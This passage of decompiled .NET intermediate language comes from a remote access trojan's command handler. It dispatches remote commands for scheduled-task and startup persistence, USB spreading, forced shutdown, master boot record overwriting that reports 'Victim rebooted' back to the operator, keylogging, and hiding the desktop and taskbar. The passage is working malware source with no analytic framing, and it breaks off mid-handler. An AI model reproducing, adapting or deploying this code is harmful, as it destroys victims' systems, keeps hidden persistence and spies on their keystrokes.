             object V_55,
             int32 V_56,
             string V_57,
             valuetype [System.Drawing]System.Drawing.Rectangle V_58,
             class [System.Drawing]System.Drawing.Bitmap V_59,
             class [System.Drawing]System.Drawing.Graphics V_60,
             valuetype [System.Drawing]System.Drawing.Size V_61,
             class [System.Drawing]System.Drawing.Bitmap V_62,
             class [mscorlib]System.IO.MemoryStream V_63,
             class [mscorlib]System.IO.MemoryStream V_64,
             string V_65,
             class [mscorlib]System.Exception V_66,
             int32 V_67,
             class [mscorlib]System.Exception V_68,
             class [mscorlib]System.Exception V_69,
             class [mscorlib]System.Exception V_70,
             class [mscorlib]System.Exception V_71,
             object[] V_72,
             bool[] V_73,
             int32 V_74,
             int32 V_75,
             class [mscorlib]System.Exception V_76,
             class [mscorlib]System.Exception V_77,
             class [mscorlib]System.Exception V_78)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string j.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string j.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.2
      IL_0018:  ldarga.s   b
      IL_001a:  call       string j.OK::BS(uint8[]&)
      IL_001f:  ldsfld     string j.OK::Y
      IL_0024:  ldc.i4.m1
      IL_0025:  ldc.i4.0
      IL_0026:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_002b:  stloc.3
      IL_002c:  ldloc.2
      IL_002d:  call       uint32 '<PrivateImplementationDetails>'::ComputeStringHash(string)
      IL_0032:  stloc.s    V_9
      IL_0034:  ldloc.s    V_9
      IL_0036:  ldc.i4     0x7a5d43c2
      IL_003b:  bgt.un     IL_018e

      IL_0040:  ldloc.s    V_9
      IL_0042:  ldc.i4     0x38276e70
      IL_0047:  bgt.un     IL_00e7

      IL_004c:  ldloc.s    V_9
      IL_004e:  ldc.i4     0x2140aabe
      IL_0053:  bgt.un.s   IL_0098

      IL_0055:  ldloc.s    V_9
      IL_0057:  ldc.i4     0x17722b8c
      IL_005c:  bgt.un.s   IL_007b

      IL_005e:  ldloc.s    V_9
      IL_0060:  ldc.i4     0x10fe67e
      IL_0065:  beq        IL_058c

      IL_006a:  ldloc.s    V_9
      IL_006c:  ldc.i4     0x17722b8c
      IL_0071:  beq        IL_0484

      IL_0076:  br         IL_0f2b

      IL_007b:  ldloc.s    V_9
      IL_007d:  ldc.i4     0x1e743595
      IL_0082:  beq        IL_0366

      IL_0087:  ldloc.s    V_9
      IL_0089:  ldc.i4     0x2140aabe
      IL_008e:  beq        IL_04b0

      IL_0093:  br         IL_0f2b

      IL_0098:  ldloc.s    V_9
      IL_009a:  ldc.i4     0x2b6ce2a9
      IL_009f:  bgt.un.s   IL_00be

      IL_00a1:  ldloc.s    V_9
      IL_00a3:  ldc.i4     0x234f382e
      IL_00a8:  beq        IL_046e

      IL_00ad:  ldloc.s    V_9
      IL_00af:  ldc.i4     0x2b6ce2a9
      IL_00b4:  beq        IL_0442

      IL_00b9:  br         IL_0f2b

      IL_00be:  ldloc.s    V_9
      IL_00c0:  ldc.i4     0x2fc941c2
      IL_00c5:  beq        IL_03a8

      IL_00ca:  ldloc.s    V_9
      IL_00cc:  ldc.i4     0x34dc6912
      IL_00d1:  beq        IL_05b8

      IL_00d6:  ldloc.s    V_9
      IL_00d8:  ldc.i4     0x38276e70
      IL_00dd:  beq        IL_04f2

      IL_00e2:  br         IL_0f2b

      IL_00e7:  ldloc.s    V_9
      IL_00e9:  ldc.i4     0x433cfaf2
      IL_00ee:  bgt.un.s   IL_013f

      IL_00f0:  ldloc.s    V_9
      IL_00f2:  ldc.i4     0x385f8569
      IL_00f7:  bgt.un.s   IL_0116

      IL_00f9:  ldloc.s    V_9
      IL_00fb:  ldc.i4     0x384ef06a
      IL_0100:  beq        IL_02f8

      IL_0105:  ldloc.s    V_9
      IL_0107:  ldc.i4     0x385f8569
      IL_010c:  beq        IL_030e

      IL_0111:  br         IL_0f2b

      IL_0116:  ldloc.s    V_9
      IL_0118:  ldc.i4     0x3b036886
      IL_011d:  beq        IL_0392

      IL_0122:  ldloc.s    V_9
      IL_0124:  ldc.i4     0x3e514fbe
      IL_0129:  beq        IL_05ce

      IL_012e:  ldloc.s    V_9
      IL_0130:  ldc.i4     0x433cfaf2
      IL_0135:  beq        IL_0610

      IL_013a:  br         IL_0f2b

      IL_013f:  ldloc.s    V_9
      IL_0141:  ldc.i4     0x52bc2c44
      IL_0146:  bgt.un.s   IL_0165

      IL_0148:  ldloc.s    V_9
      IL_014a:  ldc.i4     0x4531c525
      IL_014f:  beq        IL_05fa

      IL_0154:  ldloc.s    V_9
      IL_0156:  ldc.i4     0x52bc2c44
      IL_015b:  beq        IL_051e

      IL_0160:  br         IL_0f2b

      IL_0165:  ldloc.s    V_9
      IL_0167:  ldc.i4     0x77651492
      IL_016c:  beq        IL_0400

      IL_0171:  ldloc.s    V_9
      IL_0173:  ldc.i4     0x79fa82c1
      IL_0178:  beq        IL_03be

      IL_017d:  ldloc.s    V_9
      IL_017f:  ldc.i4     0x7a5d43c2
      IL_0184:  beq        IL_033a

      IL_0189:  br         IL_0f2b

      IL_018e:  ldloc.s    V_9
      IL_0190:  ldc.i4     0xd009b61f
      IL_0195:  bgt.un     IL_0241

      IL_019a:  ldloc.s    V_9
      IL_019c:  ldc.i4     0xaa5bd645
      IL_01a1:  bgt.un.s   IL_01f2

      IL_01a3:  ldloc.s    V_9
      IL_01a5:  ldc.i4     0x9dd9ccb2
      IL_01aa:  bgt.un.s   IL_01c9

      IL_01ac:  ldloc.s    V_9
      IL_01ae:  ldc.i4     0x8a3461c8
      IL_01b3:  beq        IL_0458

      IL_01b8:  ldloc.s    V_9
      IL_01ba:  ldc.i4     0x9dd9ccb2
      IL_01bf:  beq        IL_0324

      IL_01c4:  br         IL_0f2b

      IL_01c9:  ldloc.s    V_9
      IL_01cb:  ldc.i4     0x9f0a2c69
      IL_01d0:  beq        IL_037c

      IL_01d5:  ldloc.s    V_9
      IL_01d7:  ldc.i4     0xa8db785e
      IL_01dc:  beq        IL_0576

      IL_01e1:  ldloc.s    V_9
      IL_01e3:  ldc.i4     0xaa5bd645
      IL_01e8:  beq        IL_0508

      IL_01ed:  br         IL_0f2b

      IL_01f2:  ldloc.s    V_9
      IL_01f4:  ldc.i4     0xb949e5e4
      IL_01f9:  bgt.un.s   IL_0218

      IL_01fb:  ldloc.s    V_9
      IL_01fd:  ldc.i4     0xac9ac23e
      IL_0202:  beq        IL_0534

      IL_0207:  ldloc.s    V_9
      IL_0209:  ldc.i4     0xb949e5e4
      IL_020e:  beq        IL_049a

      IL_0213:  br         IL_0f2b

      IL_0218:  ldloc.s    V_9
      IL_021a:  ldc.i4     0xb94c4a37
      IL_021f:  beq        IL_0560

      IL_0224:  ldloc.s    V_9
      IL_0226:  ldc.i4     0xbf6b5498
      IL_022b:  beq        IL_03ea

      IL_0230:  ldloc.s    V_9
      IL_0232:  ldc.i4     0xd009b61f
      IL_0237:  beq        IL_042c

      IL_023c:  br         IL_0f2b

      IL_0241:  ldloc.s    V_9
      IL_0243:  ldc.i4     0xe981ed0f
      IL_0248:  bgt.un.s   IL_0296

      IL_024a:  ldloc.s    V_9
      IL_024c:  ldc.i4     0xd82ddf1e
      IL_0251:  bgt.un.s   IL_0270

      IL_0253:  ldloc.s    V_9
      IL_0255:  ldc.i4     0xd5a43d84
      IL_025a:  beq        IL_04c6

      IL_025f:  ldloc.s    V_9
      IL_0261:  ldc.i4     0xd82ddf1e
      IL_0266:  beq        IL_05a2

      IL_026b:  br         IL_0f2b

      IL_0270:  ldloc.s    V_9
      IL_0272:  ldc.i4     0xdeb88809
      IL_0277:  beq        IL_04dc

      IL_027c:  ldloc.s    V_9
      IL_027e:  ldc.i4     0xe09dd725
      IL_0283:  beq.s      IL_02e2

      IL_0285:  ldloc.s    V_9
      IL_0287:  ldc.i4     0xe981ed0f
      IL_028c:  beq        IL_05e4

      IL_0291:  br         IL_0f2b

      IL_0296:  ldloc.s    V_9
      IL_0298:  ldc.i4     0xf38d9cf1
      IL_029d:  bgt.un.s   IL_02bc

      IL_029f:  ldloc.s    V_9
      IL_02a1:  ldc.i4     0xef3e349a
      IL_02a6:  beq        IL_0626

      IL_02ab:  ldloc.s    V_9
      IL_02ad:  ldc.i4     0xf38d9cf1
      IL_02b2:  beq        IL_054a

      IL_02b7:  br         IL_0f2b

      IL_02bc:  ldloc.s    V_9
      IL_02be:  ldc.i4     0xf8258d3b
      IL_02c3:  beq        IL_0416

      IL_02c8:  ldloc.s    V_9
      IL_02ca:  ldc.i4     0xf9206bde
      IL_02cf:  beq.s      IL_0350

      IL_02d1:  ldloc.s    V_9
      IL_02d3:  ldc.i4     0xf967d5e7
      IL_02d8:  beq        IL_03d4

      IL_02dd:  br         IL_0f2b

      IL_02e2:  ldloc.2
      IL_02e3:  ldstr      "persis"
      IL_02e8:  ldc.i4.0
      IL_02e9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02ee:  brfalse    IL_063c

      IL_02f3:  br         IL_0f2b

      IL_02f8:  ldloc.2
      IL_02f9:  ldstr      "schedtasks"
      IL_02fe:  ldc.i4.0
      IL_02ff:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0304:  brfalse    IL_0646

      IL_0309:  br         IL_0f2b

      IL_030e:  ldloc.2
      IL_030f:  ldstr      "unschedtasks"
      IL_0314:  ldc.i4.0
      IL_0315:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_031a:  brfalse    IL_0695

      IL_031f:  br         IL_0f2b

      IL_0324:  ldloc.2
      IL_0325:  ldstr      "spreadusbme"
      IL_032a:  ldc.i4.0
      IL_032b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0330:  brfalse    IL_06bb

      IL_0335:  br         IL_0f2b

      IL_033a:  ldloc.2
      IL_033b:  ldstr      "restartme"
      IL_0340:  ldc.i4.0
      IL_0341:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0346:  brfalse    IL_06c5

      IL_034b:  br         IL_0f2b

      IL_0350:  ldloc.2
      IL_0351:  ldstr      "shutdowm"
      IL_0356:  ldc.i4.0
      IL_0357:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_035c:  brfalse    IL_06d8

      IL_0361:  br         IL_0f2b

      IL_0366:  ldloc.2
      IL_0367:  ldstr      "FuckMBR"
      IL_036c:  ldc.i4.0
      IL_036d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0372:  brfalse    IL_06eb

      IL_0377:  br         IL_0f2b

      IL_037c:  ldloc.2
      IL_037d:  ldstr      "FuckMBRNR"
      IL_0382:  ldc.i4.0
      IL_0383:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0388:  brfalse    IL_077a

      IL_038d:  br         IL_0f2b

      IL_0392:  ldloc.2
      IL_0393:  ldstr      "Flip"
      IL_0398:  ldc.i4.0
      IL_0399:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_039e:  brfalse    IL_07f7

      IL_03a3:  br         IL_0f2b

      IL_03a8:  ldloc.2
      IL_03a9:  ldstr      "mirror"
      IL_03ae:  ldc.i4.0
      IL_03af:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03b4:  brfalse    IL_0850

      IL_03b9:  br         IL_0f2b

      IL_03be:  ldloc.2
      IL_03bf:  ldstr      "Invert"
      IL_03c4:  ldc.i4.0
      IL_03c5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03ca:  brfalse    IL_08a9

      IL_03cf:  br         IL_0f2b

      IL_03d4:  ldloc.2
      IL_03d5:  ldstr      "Flashbang"
      IL_03da:  ldc.i4.0
      IL_03db:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03e0:  brfalse    IL_08ff

      IL_03e5:  br         IL_0f2b

      IL_03ea:  ldloc.2
      IL_03eb:  ldstr      "LightsOut"
      IL_03f0:  ldc.i4.0
      IL_03f1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03f6:  brfalse    IL_0955

      IL_03fb:  br         IL_0f2b

      IL_0400:  ldloc.2
      IL_0401:  ldstr      "boing"
      IL_0406:  ldc.i4.0
      IL_0407:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_040c:  brfalse    IL_09a8

      IL_0411:  br         IL_0f2b

      IL_0416:  ldloc.2
      IL_0417:  ldstr      "lockon"
      IL_041c:  ldc.i4.0
      IL_041d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0422:  brfalse    IL_0a06

      IL_0427:  br         IL_0f2b

      IL_042c:  ldloc.2
      IL_042d:  ldstr      "lockoff"
      IL_0432:  ldc.i4.0
      IL_0433:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0438:  brfalse    IL_0a98

      IL_043d:  br         IL_0f2b

      IL_0442:  ldloc.2
      IL_0443:  ldstr      "rainbow"
      IL_0448:  ldc.i4.0
      IL_0449:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_044e:  brfalse    IL_0ae0

      IL_0453:  br         IL_0f2b

      IL_0458:  ldloc.2
      IL_0459:  ldstr      "newmouse"
      IL_045e:  ldc.i4.0
      IL_045f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0464:  brfalse    IL_0b53

      IL_0469:  br         IL_0f2b

      IL_046e:  ldloc.2
      IL_046f:  ldstr      "OpenCD"
      IL_0474:  ldc.i4.0
      IL_0475:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_047a:  brfalse    IL_0b6e

      IL_047f:  br         IL_0f2b

      IL_0484:  ldloc.2
      IL_0485:  ldstr      "CloseCD"
      IL_048a:  ldc.i4.0
      IL_048b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0490:  brfalse    IL_0b85

      IL_0495:  br         IL_0f2b

      IL_049a:  ldloc.2
      IL_049b:  ldstr      "MonitorON"
      IL_04a0:  ldc.i4.0
      IL_04a1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04a6:  brfalse    IL_0b9c

      IL_04ab:  br         IL_0f2b

      IL_04b0:  ldloc.2
      IL_04b1:  ldstr      "MonitorOFF"
      IL_04b6:  ldc.i4.0
      IL_04b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04bc:  brfalse    IL_0bb2

      IL_04c1:  br         IL_0f2b

      IL_04c6:  ldloc.2
      IL_04c7:  ldstr      "HideTask"
      IL_04cc:  ldc.i4.0
      IL_04cd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04d2:  brfalse    IL_0bc8

      IL_04d7:  br         IL_0f2b

      IL_04dc:  ldloc.2
      IL_04dd:  ldstr      "ShowTask"
      IL_04e2:  ldc.i4.0
      IL_04e3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04e8:  brfalse    IL_0bdf

      IL_04ed:  br         IL_0f2b

      IL_04f2:  ldloc.2
      IL_04f3:  ldstr      "HideDesk"
      IL_04f8:  ldc.i4.0
      IL_04f9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04fe:  brfalse    IL_0bf6

      IL_0503:  br         IL_0f2b

      IL_0508:  ldloc.2
      IL_0509:  ldstr      "ShowDesk"
      IL_050e:  ldc.i4.0
      IL_050f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0514:  brfalse    IL_0c0d

      IL_0519:  br         IL_0f2b

      IL_051e:  ldloc.2
      IL_051f:  ldstr      "PermisaoFrmTerrror"
      IL_0524:  ldc.i4.0
      IL_0525:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_052a:  brfalse    IL_0c24

      IL_052f:  br         IL_0f2b

      IL_0534:  ldloc.2
      IL_0535:  ldstr      "EnviarImagemTerrorrr"
      IL_053a:  ldc.i4.0
      IL_053b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0540:  brfalse    IL_0c34

      IL_0545:  br         IL_0f2b

      IL_054a:  ldloc.2
      IL_054b:  ldstr      "Error"
      IL_0550:  ldc.i4.0
      IL_0551:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0556:  brfalse    IL_0ca7

      IL_055b:  br         IL_0f2b

      IL_0560:  ldloc.2
      IL_0561:  ldstr      "Speech"
      IL_0566:  ldc.i4.0
      IL_0567:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_056c:  brfalse    IL_0d94

      IL_0571:  br         IL_0f2b

      IL_0576:  ldloc.2
      IL_0577:  ldstr      "fun"
      IL_057c:  ldc.i4.0
      IL_057d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0582:  brfalse    IL_0dd7

      IL_0587:  br         IL_0f2b

      IL_058c:  ldloc.2
      IL_058d:  ldstr      "Piano"
      IL_0592:  ldc.i4.0
      IL_0593:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0598:  brfalse    IL_0de7

      IL_059d:  br         IL_0f2b

      IL_05a2:  ldloc.2
      IL_05a3:  ldstr      "sht"
      IL_05a8:  ldc.i4.0
      IL_05a9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05ae:  brfalse    IL_0e11

      IL_05b3:  br         IL_0f2b

      IL_05b8:  ldloc.2
      IL_05b9:  ldstr      "rst"
      IL_05be:  ldc.i4.0
      IL_05bf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05c4:  brfalse    IL_0e26

      IL_05c9:  br         IL_0f2b

      IL_05ce:  ldloc.2
      IL_05cf:  ldstr      "lof"
      IL_05d4:  ldc.i4.0
      IL_05d5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05da:  brfalse    IL_0e3b

      IL_05df:  br         IL_0f2b

      IL_05e4:  ldloc.2
      IL_05e5:  ldstr      "botk"
      IL_05ea:  ldc.i4.0
      IL_05eb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05f0:  brfalse    IL_0e50

      IL_05f5:  br         IL_0f2b

      IL_05fa:  ldloc.2
      IL_05fb:  ldstr      "ll"
      IL_0600:  ldc.i4.0
      IL_0601:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0606:  brfalse    IL_0e5a

      IL_060b:  br         IL_0f2b

      IL_0610:  ldloc.2
      IL_0611:  ldstr      "kl"
      IL_0616:  ldc.i4.0
      IL_0617:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_061c:  brfalse    IL_0e65

      IL_0621:  br         IL_0f2b

      IL_0626:  ldloc.2
      IL_0627:  ldstr      "prof"
      IL_062c:  ldc.i4.0
      IL_062d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0632:  brfalse    IL_0e8e

      IL_0637:  br         IL_0f2b

      IL_063c:  call       void Persistence::Startup()
      IL_0641:  br         IL_0f2b

      IL_0646:  ldc.i4.5
      IL_0647:  newarr     [mscorlib]System.String
      IL_064c:  dup
      IL_064d:  ldc.i4.0
      IL_064e:  ldstr      "schtasks /create /sc minute /mo 1 /tn "
      IL_0653:  stelem.ref
      IL_0654:  dup
      IL_0655:  ldc.i4.1
      IL_0656:  ldsfld     string j.OK::SCHEDNAME
      IL_065b:  stelem.ref
      IL_065c:  dup
      IL_065d:  ldc.i4.2
      IL_065e:  ldstr      " /tr "
      IL_0663:  stelem.ref
      IL_0664:  dup
      IL_0665:  ldc.i4.3
      IL_0666:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_066b:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_0670:  stelem.ref
      IL_0671:  dup
      IL_0672:  ldc.i4.4
      IL_0673:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0678:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_067d:  stelem.ref
      IL_067e:  call       string [mscorlib]System.String::Concat(string[])
      IL_0683:  ldc.i4.0
      IL_0684:  ldc.i4.1
      IL_0685:  ldc.i4     0x1388
      IL_068a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_068f:  pop
      IL_0690:  br         IL_0f2b

      IL_0695:  ldstr      "schtasks /delete /tn "
      IL_069a:  ldsfld     string j.OK::SCHEDNAME
      IL_069f:  ldstr      " /f"
      IL_06a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_06a9:  ldc.i4.0
      IL_06aa:  ldc.i4.1
      IL_06ab:  ldc.i4     0x1388
      IL_06b0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_06b5:  pop
      IL_06b6:  br         IL_0f2b

      IL_06bb:  call       void spredusb::Start()
      IL_06c0:  br         IL_0f2b

      IL_06c5:  ldstr      "shutdown -r -t 00 -f"
      IL_06ca:  ldc.i4.0
      IL_06cb:  ldc.i4.0
      IL_06cc:  ldc.i4.m1
      IL_06cd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_06d2:  pop
      IL_06d3:  br         IL_0f2b

      IL_06d8:  ldstr      "shutdown -s -t 00 -f"
      IL_06dd:  ldc.i4.0
      IL_06de:  ldc.i4.0
      IL_06df:  ldc.i4.m1
      IL_06e0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_06e5:  pop
      IL_06e6:  br         IL_0f2b

      IL_06eb:  nop
      .try
      {
        IL_06ec:  ldstr      "C://test.txt"
        IL_06f1:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_06f6:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_06fb:  ldstr      "MSG"
        IL_0700:  ldsfld     string j.OK::Y
        IL_0705:  ldstr      "MBR Overwritten, Victim rebooted."
        IL_070a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_070f:  call       bool j.OK::Send(string)
        IL_0714:  pop
        IL_0715:  call       void Stub.MBRSlayer::Start()
        IL_071a:  ldstr      "cmd /c start shutdown /r /f /t 3"
        IL_071f:  ldc.i4.0
        IL_0720:  ldc.i4.1
        IL_0721:  ldc.i4     0x1388
        IL_0726:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                   bool,
                                                                                                   int32)
        IL_072b:  pop
        IL_072c:  ldstr      "C://test.txt"
        IL_0731:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0736:  leave      IL_0f2b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_073b:  dup
        IL_073c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0741:  stloc.s    V_10
        IL_0743:  ldloc.s    V_10
        IL_0745:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_074a:  ldstr      "denied"
        IL_074f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_0754:  brfalse.s  IL_0770

        IL_0756:  ldstr      "MSG"
        IL_075b:  ldsfld     string j.OK::Y
        IL_0760:  ldstr      "Can't overwrite MBR. (No admin)"
        IL_0765:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_076a:  call       bool j.OK::Send(string)
        IL_076f:  pop
        IL_0770:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0775:  leave      IL_0f2b

      }  // end handler
      IL_077a:  nop
      .try
      {
        IL_077b:  ldstr      "C://test.txt"
        IL_0780:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_0785:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_078a:  ldstr      "MSG"
        IL_078f:  ldsfld     string j.OK::Y
        IL_0794:  ldstr      "MBR Overwritten."
        IL_0799:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_079e:  call       bool j.OK::Send(string)
        IL_07a3:  pop
        IL_07a4:  call       void Stub.MBRSlayer::Start()
        IL_07a9:  ldstr      "C://test.txt"
        IL_07ae:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_07b3:  leave      IL_0f2b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_07b8:  dup
        IL_07b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_07be:  stloc.s    V_11
        IL_07c0:  ldloc.s    V_11
        IL_07c2:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_07c7:  ldstr      "denied"
        IL_07cc:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_07d1:  brfalse.s  IL_07ed

        IL_07d3:  ldstr      "MSG"
        IL_07d8:  ldsfld     string j.OK::Y
        IL_07dd:  ldstr      "Can't overwrite MBR. (No admin)"
        IL_07e2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
